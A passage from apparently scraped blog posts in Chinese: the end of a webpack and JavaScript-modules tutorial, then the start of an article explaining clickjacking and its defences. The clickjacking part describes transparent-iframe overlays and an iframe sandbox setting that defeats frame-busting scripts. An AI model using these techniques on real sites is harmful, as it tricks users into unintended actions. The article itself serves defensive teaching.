&#123; return ((n * 100 + 20 - 4)) % 10 + 3 &#125; module.exports = &#123; cal: calculate, name: 'hello' &#125; &#125; // 加入這兩行 var m = &#123;&#125; utils(m) 這樣在呼叫完 utils 函式以後，m.exports 就是我們在 utils 函式裡面所輸出的東西，也就是 main 裡面的 require 呼叫之後應該回傳的內容。 所以最後一步，就是呼叫 main 函式並且傳入一個 require 的參數： function main(require) &#123; var obj = require('./utils') console.log(obj.cal(30)) console.log(obj.name) &#125; function utils(module) &#123; function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 &#125; module.exports = &#123; cal: calculate, name: 'hello' &#125; &#125; var m = &#123;&#125; utils(m) // 加入底下這幾行 function r() &#123; // 回傳我們所需要的 m.exports return m.exports &#125; main(r) 這樣子就大功告成了，就可以把在 utils 裡面所輸出的 module.exports 丟給 main，並且在 require(&#39;utils.js&#39;) 的時候回傳。直接把上面這一整段程式碼貼到瀏覽器上面，真的能夠順利執行了！ 上面這段程式碼只是大致上示範一下原理而已，原理基本上就是： 把檔案包成 function 並且接收 module 以及 require 等參數 在外面呼叫 function，傳入一個物件以及函式 require 不過實際上當然沒有那麼簡單，因為還有很多問題要解決，例如說： 相依性，例如說 A 依賴於 B，B 又依賴於 C，載入順序就必須是： C-&gt;B-&gt;A 載入多個模組，我們上面傳給 main 的函式只會回傳 utils 的 module.exports，但是應該要支援多個 require，所以 require 裡面要根據參數來決定回傳什麼 快取，當一個 module 被載入多次的時候應該要能夠快取起來 大概知道原理以後，我們就來看看現成的工具該如何使用。 browserify 介紹前端的世界很簡單，說穿了就是一句話： 不支援的東西，寫工具自己支援就好了 Babel 如此，webpack 如此，PostCSS 也是如此，都是藉由工具來實現瀏覽器原生不支援的功能。 在 2011 年的時候，browserify 出現了。而官網上的第一句話就已經描述了它的用途： Browserify lets you require(‘modules’) in the browser by bundling up all of your dependencies. 簡單來說，就是讓你在瀏覽器上面使用 require。 可以在 terminal 上面使用以下指令，來打包我們剛剛那兩個檔案 main.js 與 utils.js： npx browserify main.js -o bundle.js 傳入的第一個參數是所謂的入口點（entry point），就代表主要要執行的檔案。舉例來說，我們稍早在示範時都是用 node main.js 來執行，表示要執行的檔案其實是 main.js，因此 main.js 就是入口點。 然後產生的 bundle.js 內容如下： ( function e(t, n, r) &#123; function s(o, u) &#123; if (!n[o]) &#123; if (!t[o]) &#123; var a = typeof require == \"function\" &amp;&amp; require; if (!u &amp;&amp; a) return a(o, !0); if (i) return i(o, !0); var f = new Error(\"Cannot find module '\" + o + \"'\"); throw f.code = \"MODULE_NOT_FOUND\", f &#125; var l = n[o] = &#123; exports: &#123;&#125; &#125;; t[o][0].call(l.exports, function(e) &#123; var n = t[o][1][e]; return s(n ? n : e) &#125;, l, l.exports, e, t, n, r) &#125; return n[o].exports &#125; var i = typeof require == \"function\" &amp;&amp; require; for (var o = 0; o &lt; r.length; o++) s(r[o]); return s &#125;)(&#123; 1: [function(require, module, exports) &#123; function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; module.exports = &#123; cal: calculate, name: 'hello' &#125; // 把這個物件 export 出去 &#125;, &#123;&#125;], 2: [function(require, module, exports) &#123; var obj = require('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello &#125;, &#123; \"./utils\": 1 &#125;] &#125;, &#123;&#125;, [2]); 看不懂很正常，因為這是經過壓縮後的版本，但其實核心概念就是：「把你的程式碼用一個 function 包住，提供一個叫做 require 的 function 以及一個叫做 module 的物件給你使用」，說穿了跟我們上面做的事情差不多啦，只是更嚴謹了一些。 如果你真的很想看懂在幹嘛，我參考了原始碼：browser-pack&#x2F;prelude.js，把上面那段打包出來的程式碼還原了一下並且加上註解，為了方便閱讀也更動了順序，也把一些額外的檢查跟功能拿掉了。 成果如下（請注意，底下為了教學目的只留下最核心的功能，其餘程式碼都拿掉了）： // 跟我們做的事情一樣，把檔案包成一個 function，傳入 require, modules function utils(require, module) &#123; function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 &#125; module.exports = &#123; cal: calculate, name: 'hello' &#125; &#125; // 跟我們做的事情一樣，把檔案包成一個 function，傳入 require, modules function main(require, module) &#123; var obj = require('./utils') console.log(obj.cal(30)) console.log(obj.name) &#125; /* 定義一個叫做 modules 的物件，裡面把 module 換成數字編號 陣列的第一個參數就是上面包好的 function，第二個參數則是相依性需要的 module 以及編號 例如說： &#123; \"./utils\": 1 &#125; 代表說當我呼叫 require(\"./utils\") 的時候，其實就是要載入編號為 1 的 module */ var modules = &#123; 1: [utils, &#123;&#125;], 2: [main, &#123; \"./utils\": 1 &#125;] &#125; /* 函式詳細內容可以見底下，第一個參數就是 modules 第二個參數是 cache（先不管） 第三個參數則是入口點，就像是 C 語言裡面的 main function 那樣 以我們的範例來說，就是 main.js 這個檔案，也就是編號為 2 的 module */ outer(modules, &#123;&#125;, [2]) /* 底下程式碼來自：https://github.com/browserify/browser-pack/blob/master/prelude.js 為了方便理解核心功能，有經過刪改 */ function outer(modules, cache, entry) &#123; /* 順序執行 entry，在我們的例子 entry 只有一個 所以可以簡單想成是：newRequire(2) */ for (var i = 0; i &lt; entry.length; i++) &#123; newRequire(entry[i]); &#125; /* 核心程式碼在下面 以我們的例子而言，name 會是 2 */ function newRequire(name) &#123; //先從 cache 裡面找這個 module 的內容，找不到的話載入 module 並且放入 cache if (!cache[name]) &#123; // 找不到要載入的 module，拋出錯誤 if (!modules[name]) &#123; var err = new Error('Cannot find module \\'' + name + '\\''); err.code = 'MODULE_NOT_FOUND'; throw err; &#125; /* 宣告一個物件來儲存 module export 出來的東西 並且一併放到 cache 裡面 */ var m = cache[name] = &#123; exports:&#123;&#125; &#125;; /* 核心功能就是底下這四行 呼叫我們最前面定義的那個包好的 function，並且傳入 require 以及 module 在 require 裡面會根據 modules 的內容找到要引入的 id 以 require('./utils') 為例 modules[2][1]['./utils'] 是 1，就會去載入 id 為 1 的 module 並且回傳 */ modules[name][0].call(m.exports, function(x)&#123; var id = modules[name][1][x]; // 載入 module 並且回傳 return newRequire(id ? id : x); &#125;, m); &#125; // 找到的話就直接回傳 module.exports return cache[name].exports &#125; &#125; 原本的程式碼因為要考慮其他更多種情況所以比較複雜一些，只留下核心的模組功能差不多就長得像上面那樣。看不懂沒有關係，畢竟這是比較偏新手向的文章，只要稍微看過去就好。 你只要知道一個重點就行了： 瀏覽器原生並不支援 CommonJS（require 與 module.exports），一定要透過工具才能在瀏覽器上面使用。 上面提到的「工具」，我們已經介紹 browserify 了，但還有一個更有名的。 對，就是 webpack！ 初探 webpack剛才我們使用 browserify 的時候，使用了這個指令來指定入口點與打包出來的檔案名稱： npx browserify main.js -o bundle.js 而 webpack 本質上與 browserify 相似，只是需要把這些變成設定檔。我們可以新增一個 webpack.config.js： module.exports &#x3D; &#123; entry: &#39;.&#x2F;main.js&#39;, output: &#123; path: __dirname, filename: &#39;webpack_bundle.js&#39; &#125; &#125; 仔細觀察就會發現這其實跟使用 browserify 時要設定的選項是一樣的，入口點以及輸出的檔案名稱以及路徑（__dirname 代表跟 config 檔同一個目錄）。 接著在 terminal 上面執行這幾行指令，簡單來說就是先安裝 webpack 然後執行 webpack： npm init -y npm install webpack webpack-cli --save-dev npx webpack --config webpack.config.js 接著就會看到目錄下多了一個 webpack_bundle.js，內容也是完全看不懂的東西。這是因為 webpack 有兩個模式，production 與 development，預設是前者。production 代表在生產環境下使用，所以會自動幫你壓縮以及優化。 在開發的時候通常會使用 development 這個模式，打包的速度較快。更改的方式很簡單，改變設定檔即可： module.exports = &#123; mode: 'development', entry: './main.js', output: &#123; path: __dirname, filename: 'webpack_bundle.js' &#125; &#125; 存檔以後再執行一次 npx webpack --config webpack.config.js，結果如下： /******/ (function(modules) &#123; // webpackBootstrap /******/ // The module cache /******/ var installedModules = &#123;&#125;; /******/ /******/ // The require function /******/ function __webpack_require__(moduleId) &#123; /******/ /******/ // Check if module is in cache /******/ if(installedModules[moduleId]) &#123; /******/ return installedModules[moduleId].exports; /******/ &#125; /******/ // Create a new module (and put it into the cache) /******/ var module = installedModules[moduleId] = &#123; /******/ i: moduleId, /******/ l: false, /******/ exports: &#123;&#125; /******/ &#125;; /******/ /******/ // Execute the module function /******/ modules[moduleId].call(module.exports, module, module.exports, __webpack_require__); /******/ /******/ // Flag the module as loaded /******/ module.l = true; /******/ /******/ // Return the exports of the module /******/ return module.exports; /******/ &#125; /******/ /******/ /******/ // expose the modules object (__webpack_modules__) /******/ __webpack_require__.m = modules; /******/ /******/ // expose the module cache /******/ __webpack_require__.c = installedModules; /******/ /******/ // define getter function for harmony exports /******/ __webpack_require__.d = function(exports, name, getter) &#123; /******/ if(!__webpack_require__.o(exports, name)) &#123; /******/ Object.defineProperty(exports, name, &#123; enumerable: true, get: getter &#125;); /******/ &#125; /******/ &#125;; /******/ /******/ // define __esModule on exports /******/ __webpack_require__.r = function(exports) &#123; /******/ if(typeof Symbol !== 'undefined' &amp;&amp; Symbol.toStringTag) &#123; /******/ Object.defineProperty(exports, Symbol.toStringTag, &#123; value: 'Module' &#125;); /******/ &#125; /******/ Object.defineProperty(exports, '__esModule', &#123; value: true &#125;); /******/ &#125;; /******/ /******/ // create a fake namespace object /******/ // mode &amp; 1: value is a module id, require it /******/ // mode &amp; 2: merge all properties of value into the ns /******/ // mode &amp; 4: return value when already ns object /******/ // mode &amp; 8|1: behave like require /******/ __webpack_require__.t = function(value, mode) &#123; /******/ if(mode &amp; 1) value = __webpack_require__(value); /******/ if(mode &amp; 8) return value; /******/ if((mode &amp; 4) &amp;&amp; typeof value === 'object' &amp;&amp; value &amp;&amp; value.__esModule) return value; /******/ var ns = Object.create(null); /******/ __webpack_require__.r(ns); /******/ Object.defineProperty(ns, 'default', &#123; enumerable: true, value: value &#125;); /******/ if(mode &amp; 2 &amp;&amp; typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) &#123; return value[key]; &#125;.bind(null, key)); /******/ return ns; /******/ &#125;; /******/ /******/ // getDefaultExport function for compatibility with non-harmony modules /******/ __webpack_require__.n = function(module) &#123; /******/ var getter = module &amp;&amp; module.__esModule ? /******/ function getDefault() &#123; return module['default']; &#125; : /******/ function getModuleExports() &#123; return module; &#125;; /******/ __webpack_require__.d(getter, 'a', getter); /******/ return getter; /******/ &#125;; /******/ /******/ // Object.prototype.hasOwnProperty.call /******/ __webpack_require__.o = function(object, property) &#123; return Object.prototype.hasOwnProperty.call(object, property); &#125;; /******/ /******/ // __webpack_public_path__ /******/ __webpack_require__.p = \"\"; /******/ /******/ /******/ // Load entry module and return exports /******/ return __webpack_require__(__webpack_require__.s = \"./main.js\"); /******/ &#125;) /************************************************************************/ /******/ (&#123; /***/ \"./main.js\": /*!*****************!*\\ !*** ./main.js ***! \\*****************/ /*! no static exports found */ /***/ (function(module, exports, __webpack_require__) &#123; eval(\"var obj = __webpack_require__(/*! ./utils */ \\\"./utils.js\\\")\\nconsole.log(obj.cal(30)) // 9\\nconsole.log(obj.name) // hello\\n\\n\\n//# sourceURL=webpack:///./main.js?\"); /***/ &#125;), /***/ \"./utils.js\": /*!******************!*\\ !*** ./utils.js ***! \\******************/ /*! no static exports found */ /***/ (function(module, exports) &#123; eval(\"function calculate(n) &#123; \\n return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式\\n&#125;\\n \\nmodule.exports = &#123;\\n cal: calculate,\\n name: 'hello'\\n&#125; // 把這個物件 export 出去\\n\\n//# sourceURL=webpack:///./utils.js?\"); /***/ &#125;) /******/ &#125;); 跟 browserify 一樣，你把上面這整串貼到瀏覽器的 console 去，一樣可以正常執行並輸出結果。上面的程式碼不用細看，大致上滑過去就好，但你滑過去的時候就會發現有許多東西跟 browserify 打包出來的程式碼類似。 好，看到這邊相信大家已經知道了兩個重點： webpack 與 browserify 類似 要在瀏覽器上面使用 CommonJS 的模組機制，就必須使用工具先把程式碼打包才能做到 而第二點就是必須使用 webpack 的理由。 這時你可能會想問一個問題： 可是我們公司沒有用 require，而是用 ES6 的 import 與 export，這個瀏覽器不是支援了嗎？那為什麼需要 webpack？ 問得很好，看到這邊可以先起身喝個水，下半場要開始了。 ES6 的標準化模組前面有提到在 ES6 出現以前，JavaScript 並沒有一個標準的模組化規範。Node.js 支援 CommonJS，所以才可以用require跟module.exports，但是瀏覽器原生沒有支援，所以才需要像是 browserify 以及 webpack 這種工具。 而 ES6 出來之後，終於有了正式的規範，就是大家常看到的 import 與 export，我們可以把之前的 main.js 與 utils.js 改成 import 與 export 的形式： // main.js import obj from './utils' console.log(obj.cal(30)) console.log(obj.name) //utils.js function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; export default &#123; cal: calculate, name: 'hello' &#125; 雖然說這是 ES6 的標準，但其實支援度還不是很好。 若是你在 Node.js 上面試圖執行 node main.js，會直接噴給你一個 SyntaxError: Unexpected identifier 的錯誤，因為 Node.js 不認識 import 這個語法。 想要在 Node.js 上面使用 import 與 export 的話有兩個方法，第一個方法是把副檔名從 .js 換成 .mjs，然後在使用 node 時加上一個 flag：node --experimental-modules main.mjs。 順帶一提，這是 Node.js 版本 &lt; 13 時的狀況，如果是最新的 13 版本以上，只要把檔名改成 mjs 就好，詳情可以參考：Node.js v13.7.0 Documentation: ECMAScript Modules。 第二個方法就是大名鼎鼎的 babel 啦，靠著 babel 幫我們把 ES6 的語法轉成 ES5，可以直接使用在 babel 官網上提供的簡易線上轉換器，把 main.js 的內容從 import 轉成 require： 上面講的都是 Node.js 的使用，那瀏覽器呢？ 可以先來試試看什麼都不要改變，一樣只有 main.js 與 utils.js，然後新增一個 index.html，內容如下： &lt;html> &lt;head> &lt;script src=\"./main.js\">&lt;/script> &lt;/head> &lt;body> &lt;/body> &lt;/html> 打開之後會看到 devtool 的 console 吐了這樣一個錯誤： Uncaught SyntaxError: Cannot use import statement outside a module 跟 Node.js 類似，若是想要使用 import 與 export，都必須以 module 的形式來執行，所以要在 script 標籤加上 type： &lt;html> &lt;head> &lt;script src=\"./main.js\" type=\"module\">&lt;/script> &lt;/head> &lt;body> &lt;/body> &lt;/html> 接著再次打開頁面，會發現還是有一個錯誤： Access to script at &#39;file:&#x2F;&#x2F;&#x2F;Users&#x2F;huli&#x2F;w_test&#x2F;main.js&#39; from origin &#39;null&#39; has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, chrome-extension, https. 因為我目前打開 index.html 是直接點兩下打開，所以其實是開檔案而已，網址開頭會是 file:///。若是要使用 import 的話，必須要用伺服器的方式開啟才行。可以在同一個目錄底下輸入這行指令，簡單跑一個 file server： python -m SimpleHTTPServer 8080 接著就可以打開：http://localhost:8080。 很不巧地，這次又出現了一個錯誤：GET http://localhost:8080/utils net::ERR_ABORTED 404 (File not found) 要把 main.js 裡的 import obj from &#39;./utils&#39; 改成：import obj from &#39;./utils.js&#39; 才行，要明確指定是要引入 .js 這個檔案。 改完之後重新整理，就可以在 console 上面看到正確的結果了！底下是完整的程式碼，只有三個檔案而已： main.js import obj from './utils.js' console.log(obj.cal(30)) console.log(obj.name) utils.js function calculate(n) &#123; return ((n * 100 + 20 - 4)) % 10 + 3 // 計算價格公式 &#125; export default &#123; cal: calculate, name: 'hello' &#125; index.html &lt;html> &lt;head> &lt;script src=\"./main.js\" type=\"module\">&lt;/script> &lt;/head> &lt;body> &lt;/body> &lt;/html> 到這裡為止一切看似順利，好像沒什麼問題。在網頁上只要把引入的標籤多一個 type=&quot;module&quot; 就可以跑起來了，很棒啊。 事情是沒有那麼簡單的。 第一個問題，瀏覽器支援度。 其實這個問題說大不大說小不小，端看貴公司有沒有要支援 IE，因為各大瀏覽器都有支援 import 與 export，可是 IE 沒有。 第二個問題，我想要使用 npm 上面其他人寫的套件的話怎麼辦？ 在 Node.js 裡面沒有這個問題，因為你一定會在資料夾底下先裝好 node_modules，可是網頁呢？難道要把整個 node_modules 資料夾一起傳上去嗎？ 還有一個問題是當你在 import 的時候，路徑要怎麼寫？難道要寫明是：import pad from &#39;./node_modules/pad-left/index.js&#39; 這樣嗎？這是可維護性相當差的一個寫法，若是模組的入口點變了，你就必須改寫所有 import 的地方。 這個問題其實是相當麻煩的，因為在開發時通常都會用到其他人寫好的模組，若是沒辦法很方便地去支援引入這些模組，會造成很多不便利。 還記得我前面說過的話嗎？ 「前端的世界很簡單，不支援的東西，寫工具自己支援就好了。」，這邊要稍微修改一下，變成：「前端的世界很簡單，不支援或是支援度很差的東西，寫工具自己支援就好了」。 就是因為瀏覽器原生的模組機制會碰到許多問題（相容性、無法兼容 npm 等等），所以我們才需要一個額外的工具。 而這個工具，就是 webpack。 再探 webpack為了來體驗 webpack 的強大之處，我們先隨便找一個套件來安裝： npm install pad-left 接著在 main.js 裡面引入套件並且使用： import obj from './utils.js' import pad from 'pad-left' console.log(obj.cal(30)) console.log(pad('4', 4, 0)) 然後一樣按照之前教過的流程打包檔案，config 檔之前已經寫過了，所以直接下指令就好： npx webpack --config webpack.config.js 接著打開 index.html，更改引入的 script，因為有 webpack 的關係所以不需要 type=module 了： &lt;html> &lt;head> &lt;script src=\"./webpack_bundle.js\">&lt;/script> &lt;/head> &lt;body> &lt;/body> &lt;/html> 最後打開 index.html，看到 console 上面出現 9 跟 0004 這兩個輸出，就代表有打包成功了。 所以使用 webpack 的好處之一，就是我們能把使用 npm 安裝的模組一併打包，就跟打包自己寫的模組一樣，不需要多做其他事情。這件事是原生的瀏覽器沒辦法做到的。 我們之所以需要 webpack，就是因為原生的瀏覽器模組功能跟支援度都沒那麼完整。 不過呢，其實 webpack 的強大之處不只這樣而已。打開 webpack 官網，會看到這張圖： webpack 最厲害的地方在於它把「模組化」這個概念延伸了。我們剛剛在談論模組化的時候，都只有討論 JavaScript，討論程式上的模組。但 webpack 把「任何資源」都視成一個模組。 圖片是模組，所以你可以 import Image from &#39;./assets/banner.png&#39;；CSS 是模組，你可以 import styles from &#39;style.css&#39;，只要是任何資源都可以 import 進來使用。 這已經跟 JavaScript 與 ES6 一點關係都沒有了，這完全是 webpack 自己的延伸，在瀏覽器上面你是沒有辦法這樣使用的。 為了要支援這樣的功能，webpack 定義了許多 loader（載入器），不同的資源有不同的 loader，要透過 loader 處理才能把資源載入。而這個 loader 也是它強大的地方。 例如說你可以用 scss loader 載入 scss 的檔案，在引入資源的時候就會幫你順便編譯成 CSS，所以你不用自己做這件事。JS 也是一樣，你可以寫最新最潮的語法，然後在載入時用 babel-loader 把 ES10 的語法轉成 ES5。 這種資源的引入以及轉換，才是 webpack 最強大的地方。 還記得你在寫 React 的時候，把 import 圖片跟 CSS 當作吃飯喝水一樣嗎？好像這樣是很稀鬆平常的事。 你能夠寫出這種語法而且被支援，都是因為底層有 webpack 在幫你做處理，都是因為有 image loader 跟 css loader 特別處理你的 import。這不是瀏覽器原生就支援的東西，而是 webpack 的模組系統幫你做的事。 再者，掌握了資源的打包這一段之後，webpack 就可以藉由 loader 以及 plugin 做更多有趣的事，例如說： 在載入 JS 的時候順便做 uglify 在載入 CSS 的時候順便做 minify 把打包出來的檔名順便加上 hash 根據不同頁面打包不同的檔案，就不用一次載入全部 JS 支援動態引入 JS，有需要的時候才載入 webpack 的教學就到這邊了，我沒有打算繼續深講，再講下去就比較偏向工具的使用了。我寫這篇最主要的目的只是想讓你知道： 為什麼要用 webpack？ 不用 webpack 的話會怎樣？ webpack 與 ES6 定義的標準模組有什麼差別？ webpack 的最基礎使用（寫設定檔與打包 JS） Snowpack前面我們有提到使用 webpack 的原因之一是原生的瀏覽器沒辦法打包 npm 安裝的模組，而 webpack 除了解決這個問題之外，還順便擴展了「模組」的定義，任何資源都可以視為一個模組，搭配強大的 loader 與 plugin 系統也可以做出更多有趣的事。 而近期剛好出了另外一個 library：Snowpack，標榜的就是不需要打包就能夠在瀏覽器上面跑，而原理十分簡單，其實就是幫你把 node_modules 安裝的模組整理了一下，放到另一個叫做 web_modules 的資料夾，要引入的時候去那邊引入就好了。 不過並不是每個模組都可以這樣，必須模組本身有支援標準的 ESM module 才行。像我們剛剛所使用的pad-left 就沒有，所以沒有辦法搭配 Snowpack 使用，因此我們等等會再裝一個有支援的 mathjs 來試試看。 我們立刻來體驗一下吧，先把 Snowpack 跟 mathjs 裝起來： npm install --save-dev snowpack npm install mathjs 接著執行 Snowpack，讓它把模組整理好： npx snowpack 執行完之後，就會看到多了一個 web_modules 的資料夾，底下有兩個檔案：import-map.json 與 mathjs.js 接著我們更新一下 main.js： import obj from './utils.js' import &#123;pi&#125; from './web_modules/mathjs.js' // 從 web_modules 資料夾引入 console.log(obj.cal(30)) console.log(pi) 然後更新 index.html： &lt;html> &lt;head> &lt;script src=\"./main.js\" type=\"module\">&lt;/script> &lt;/head> &lt;body> &lt;/body> &lt;/html> 最後一樣要用指令跑一個 server 起來：python -m SimpleHTTPServer 8080 發現 console 有出現 3.141592653589793，代表可以順利使用我們用 npm 安裝的模組了！ Snowpack 的使用方式就是那麼簡單，要解決的問題也很簡單，它只負責解決「引入第三方模組」這一塊，其他的不在它管理的範疇。 它能像 webpack 那樣子引入圖片跟 CSS 嗎？不行，而且官方網站直接建議你用以前的那些方法就好了： 在官網上也有誰應該要用 Snowpack 誰應該不要用的段落，例如說你想要支援 IE11 或是你需要用到不支援 ESM 的函式庫的話，就不應該使用 Snowpack。 Snowpack 還很新，而且若是想在 production 上面使用應該還有滿多問題要解決，我在這邊特別提它的目的是想讓大家看看除了 webpack 以外的另一種解決方式。 而你可能聽過的 parcel 或者是 rollup，都只是另外一種幫你打包的工具而已。你可以選一套工具來熟悉就好，但重點是在這之前，你必須清楚知道為什麼需要這些工具。 結語先來回答開頭那幾個問題： Q：為什麼很多專案（例如說 React）在部署前都要先 build？這個步驟在幹嘛你知道嗎？因為原始碼沒辦法直接放上去瀏覽器（會沒有辦法執行），所以一定要經過 webpack 打包處理，打包完的檔案才能讓瀏覽器執行。 Q：你知道 require/module.exports 與 import/export 的差別嗎？require/module.exports 是一套叫做 CommonJS 的規範，Node.js 有支援，瀏覽器沒有。 import/export 是 ES6 的規範，Node.js 部分支援，瀏覽器也是部分支援。 Q：你知道 import 與 export 這兩個語法在瀏覽器上面不是隨便就能使用嗎？有使用限制，例如說要加上 type=module，而且也沒辦法直接引入 npm 裡的模組，要把路徑寫死才能使用。而瀏覽器支援度也是一個考量，IE11 並不支援此種寫法。 Q：你知道為什麼要用 webpack 嗎？原因有很多，例如說： 我想使用 npm 上的第三方模組 我想把圖片當作資源 import 進來 我想把 CSS 當作資源 import 進來 我想在一個地方就處理好 uglify 與 minify 不過重點其實是第一個，因為瀏覽器原生的 ES6 模組支援度沒那麼高，尤其是引入第三方模組，所以才需要透過 webpack 或其他打包工具幫我們處理好這一段。 Q：你知道 webpack 為什麼要有 loader 嗎？因為把圖片或是 CSS 當作資源引入這並不是正式的規範，而是 webpack 自己延伸的定義。為了支援這些資源，就必須特別寫一個 loader 去載入，否則預設的 loader 只能載入 JavaScript。 我一開始接觸 webpack 時，也是超級霧煞煞。完全不知道為什麼要 webpack，也完全不知道它做了哪些魔法。 直到後來慢慢摸索才發現自己一開始就錯了，不該從 webpack 開始的。連模組化的概念都不清楚，連瀏覽器上面不能用 require 都不知道，怎麼可能理解 webpack 在幹嘛？ 而前陣子接觸到的一些學生，儘管是有工作經驗或是有用過 webpack 的，對這一塊也是一知半解。而在我看來，原因就是對於模組化的理解不足，對於歷史脈絡的了解不夠，對於「在瀏覽器上面執行 JS」以及「在電腦上用 Node.js 執行 JS」這兩者的區分不夠清楚，才會把許多東西都混為一談，當作是同一種。 所以這篇雖然是叫做「webpack 新手教學」，但比較多在談的是模組化以及使用 webpack 的理由，對於真正「如何使用 webpack」並沒有加以著墨。原因之一是我認為理解原理跟理由之後，使用工具的門檻就會降低很多；之二是再寫下去就沒完沒了了，真的想講 webpack 的話可以再開一篇文章。 其實有關於模組化，我有很多東西刻意沒有提到，例如說 AMD&#x2F;UMD 等等的其他規範以及 RequireJS 這個工具。我覺得對這一篇想表達的東西來說，不講這些反而是好的，因為一旦講了就會把事情搞得更複雜，所以選擇性忽略這些內容。 在寫作的時候，選擇什麼要講什麼不講也是一門技藝，或許日後可以再寫一篇文章來補齊沒有講到的這些部分。 最後，希望大家看完這篇以後真的能理解 ES6 的原生模組在瀏覽器上面會碰到的問題，就能知道為什麼要用 webpack。 若是有任何錯誤還麻煩不吝指正，感謝！ 參考資料： 什麼？！我們竟然有 3 個標準？ - 你有聽過 CommonJS 嗎？(Day9)","link":"/2020/01/21/webpack-newbie-tutorial/"},{"title":"不識廬山真面目：Clickjacking 點擊劫持攻擊","text":"前言在針對前端的各種攻擊手法之中，我覺得 clickjacking 是相當有趣的一個。它的中文翻譯通常翻成「點擊劫持」，實際上的意思是你以為點了 A 網頁的東西，其實卻是點到了 B 網頁，惡意網頁劫持了使用者的點擊，讓使用者點到意料之外的地方。 只是一個點擊而已，這樣會有什麼危害嗎？ 假設在背後的是一個銀行轉帳頁面，而且帳號跟金額都填好了，只要按一個按鈕就會轉錢出去，這樣的話危害就很大了（不過這通常不太可能啦，因為轉帳還需要輸入 OTP 之類的，這只是舉例）。 或是舉個更常見的例子，例如說有個乍看之下是取消訂閱電子報的頁面，於是你點了「確定取消」的按鈕，但其實底下藏著的是 Facebook 的按讚鈕，所以你不但沒有取消訂閱，還被騙了一個讚（因為劫持的目標是讚，所以又稱為 likejacking）。 這篇文章我會介紹 clickjacking 的攻擊原理、防禦方式以及實際案例，讓大家更了解這個攻擊手法。 Clickjacking 攻擊原理Clickjacking 的原理就是把兩個網頁疊在一起，透過 CSS 讓使用者看見的是 A 網頁，但點到的卻是 B 網頁。 以比較技術的講法來說，就是用 iframe 把 B 網頁嵌入然後設透明度 0.001，再用 CSS 把自己的內容疊上去，就大功告成了。 我覺得 clickjacking 直接看範例是最有趣的，因此做了一些簡單的範例。 底下這個範例可以先點擊「確定取消」的按鈕，然後再點「切換透明度」，就可以看到背後其實是修改個人資料的頁面以及刪除帳號的按鈕： 所以我以為我點了「確定取消」，但實際上點到的卻是「刪除帳號」，這就是 clickjacking。 上面的 iframe 如果打不開，可以去這邊玩：clickjacking 範例。 有些人可能會覺得這個範例太過簡單，實際應用中可能很少出現這種這麼簡單的攻擊，只要按一個按鈕而已，或許更多網站會更複雜一點，例如說要先輸入一個什麼東西？ 底下這個範例以「更改 email」這個功能來設計 clickjacking，比起前一個範例是整個網頁蓋過去，這個範例刻意留下原網頁的 input，其他都用 CSS 蓋掉，按鈕的部分用 pointer-events:none 讓事件穿透。 看似是一個輸入 email 訂閱資訊的網頁，但按下確定之後卻跳出「修改 email 成功」，因為背後其實是個修改 email 的網頁： 上面的範例沒看到的話，可以去這邊玩：進階 clickjacking 範例。 除此之外，我也有在最新的跨瀏覽器攻擊手法：Clickjacking 這篇裡面看到一個很有趣的範例：假遊戲真劫持（YouTube 影片），看似是遊戲但其實只是為了讓你去點按鈕，超級有趣！ 寫到這邊，幫 clickjacking 做個總結，這個攻擊手法大概就是： 把目標網頁嵌入惡意網頁之中（透過 iframe 或其他類似標籤） 在惡意網頁上用 CSS 把目標網頁蓋住，讓使用者看不見 誘導使用者前往惡意網頁並且做出操作（輸入或點擊等等） 觸發目標網頁行為，達成攻擊 因此實際上攻擊的難易度，取決於你的惡意網站設計得怎麼樣，以及目標網頁的原始行為需要多少互動。舉例來說，點擊按鈕就比輸入資訊要容易得多。 然後還要提醒一點，這種攻擊要達成，使用者要先在目標網站是登入狀態才行。只要能把目標網頁嵌入惡意網頁之中，就會有 clickjacking 的風險。 Clickjacking 防禦方式如同前面所述，只要能被其他網頁嵌入就會有風險，換句話說，如果沒辦法被嵌入，就不會有 clickjacking 的問題了，這就是解決 clickjacking 的方式。 一般來說點擊劫持的防禦方式可以分為兩種，一種是自己用 JavaScript 檢查，另一種是透過 response header 告知瀏覽器這個網頁是否能被嵌入。 Frame busting有一種叫做 frame busting 的方式，就是我前面提到的自己用 JavaScript 檢查，原理很簡單，程式碼也很簡單： if (top !== self) &#123; top.location = self.location &#125; 每一個網頁都有自己的 window object，而 window.self 指向的會是自己的 window，那 top 的話就是 top window，可以想成是這整個瀏覽器的「分頁」最上層的 window。 如果今天是被獨立開啟的網頁，那 top 跟 self 就會指向同一個 window，但如果今天網頁是被鑲在 iframe 裡面，top 指的就會是使用 iframe 的那個 window。 舉個例子好了，假設今天我在 localhost 有個 index.html，裡面寫著： &lt;iframe src=\"https://example.com\">&lt;/iframe> &lt;iframe src=\"https://onedegree.hk\">&lt;/iframe> 那關係圖就會是這樣： 綠色跟黃色分別是兩個以 iframe 載入的網頁，也就是兩個不同的 window，在這兩個網頁裡面如果存取 top 的話，就會是 localhost/index.html 的 window object。 所以透過 if (top !== self) 的檢查，就可以知道自己是不是被放在 iframe 裡面。如果是的話，就改變 top.location，把最上層的網頁導向其他地方。 聽起來很美好而且沒什麼問題，但其實會被 iframe 的 sandbox 屬性繞過。 iframe 可以設置一個屬性叫做 sandbox，代表這個 iframe 的功能受到限制，如果要把限制打開必須明確指定，可以指定的值包括： allow-forms，允許提交表單 allow-scripts，允許執行 JS allow-top-navigation，允許改變 top location allow-popups，允許彈出視窗 （還有一大堆，詳情可參考 MDN: iframe） 也就是說，如果我是這樣載入 iframe 的： &lt;iframe src=\"./busting.html\" sandbox=\"allow-forms allow-scripts\"> 那就算 busting.html 有上面我說的那個防護也沒有用，因為 JavaScript 不會執行，所以那段 script 就不會跑到，但 user 還是可以正常 submit 表單。 於是就有人提出了更實用的方法，在現有基礎上做一些改良（程式碼取自：Wikipedia - Framekiller）： &lt;style>html&#123;display:none;&#125;&lt;/style> &lt;script> if (self == top) &#123; document.documentElement.style.display = 'block'; &#125; else &#123; top.location = self.location; 